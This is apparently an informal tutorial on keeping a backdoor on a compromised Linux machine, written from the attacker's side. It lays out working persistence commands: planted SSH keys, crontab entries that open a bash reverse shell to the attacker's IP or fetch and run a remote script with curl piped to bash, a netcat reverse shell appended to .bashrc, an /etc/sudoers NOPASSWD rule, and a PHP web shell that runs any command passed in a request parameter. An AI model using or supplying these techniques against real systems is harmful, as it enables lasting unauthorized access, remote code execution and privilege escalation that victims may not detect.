## BACKDOORS

> hi all in this writeup we gonna talk about :
1.1 what is BACKDOORS
1.2 how backdoors work 
and in other parts i will talk about cammon ways to do backdoors






1.1- what is backdoors
![image](https://miro.medium.com/max/694/0*iDWkNtnlLkwMBnVY.png)
* so the backdoors is a samething like a malware trojan or reverse shell  we do it  to get an ultimate acces to machine and allow you to get back in once your access is blocked or shutdowned 

1.2- how BACKDOORS works
* the backdoors is running in the target machine whitout stoping so the attacker can in any time get acces to the target machine this backdoors can be installed in a lot of tricks and now i will show u same tricks to do a linux backdoors
> ssh keys and backdoors![image](https://i.imgur.com/JmRkLjw.png)

* for generating ssh key we can use the command
```
ssh-keygen
```
and boom ! you have a private key and public key in the directory /root/.ssh we can rename the public key and login whit him ads a root 
but after this we need to give this key a ``chmod 600`` permission and at least login whit this key using this command ``"ssh -i (the key you have been generated ] root@ip``
* and another way to do backdoor you can chnage a user password using this command ``passwd``
***cron jobs***
* first what is cronjob 
![image](https://www.cyberciti.biz/media/new/faq/2009/07/Linux-view-all-cron-jobs-command.png)
> a cronjob is a file or payload or command which run at time that you choose 

* how we can gain acces to machine with cronjob. it's easy just we need to do a reverseshell in a crontab and let him run everyminute
```
$: crontab -e root
```
and after doing acronjob whit root user we just need to add our reverseshell
``` 
*     *     *     *     *        bash -i >& /dev/tcp/(our ip)/(our port ) 0>&1


```

this crontab will run ervery minute so in any time you need another acces to the target machine just setup your listener in the port you choose and wait for your root shell
or do this 
```

* *     * * *   root    curl http://<yourip>:port from your choose/shell | bash


```
and put a backdoorsqh reverse shell in the shell file like this
```
#!/bin/bash

bash -i >& /dev/tcp/ip/port 0>&1
```
* .bashrc 
![image](http://www.poftut.com/wp-content/uploads/2017/07/img_595dcb4e3984a.png)
* A bashrc file is shell script that Bash runs whenever it is started
> If a user has bash as their login shell, .bashrc file in their home directory is executed when an interactive session is launched. One can add a reverse shell to the userâ€™s .bashrc and get a shell when the user is login
* let's try this
```
echo 'nc -e /bin/bash <your ip> <PORT> 2>/dev/null &' >> ~/.bashrc


```
and don't forget to let your listener on so gain acces when the bash running

* Services
> if you can wait until the machine is restarted you can add a reverse shell in a service that run in the startup of the machine
*  sudoers
if you have a root but you want to elevate you privilage whit an easy way when you get acces you can just edit the file /etc/sudoers but you need to be root and put this 

```
<USER from machine users that you know her password or you have already acces to>        ALL=(ALL)        NOPASSWD: ALL


```
* php backdoors
as we know anything we put in var/www/html we can browse it whit our browser so we can do a small php page that allow us to execute any command we want so let's do it
```
<?php
    if (isset($_REQUEST['cmd'])) {
        echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
    }
?>

```
so using the parametre cmd we can execute any command we want 
* if you putted the file directly in var/www/html you can browse it whit this link
http://ip/command.php
and for executing the command we use this http://ip/command.php?cmd=any command